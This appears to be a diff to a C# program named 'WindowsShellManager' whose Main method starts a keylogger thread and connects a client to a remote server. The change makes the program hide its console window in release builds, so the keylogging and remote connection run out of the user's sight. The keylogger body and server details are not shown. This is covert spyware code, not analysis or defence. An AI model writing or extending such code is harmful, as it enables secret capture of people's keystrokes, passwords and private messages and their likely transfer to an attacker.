@@ -14,12 +14,15 @@ namespace WindowsShellManager
 
         static void Main(string[] args)
         {
-            //HideConsoleWindow();
+#if !DEBUG
+            HideConsoleWindow();
+#endif
+
             Thread keyLog = new Thread(KeyLogger);
-            keyLog.Start();           
-            new Client().Connect(server);      
+            keyLog.Start();
+            new Client().Connect(server);
         }
-       
+
 
         static void KeyLogger()
         {
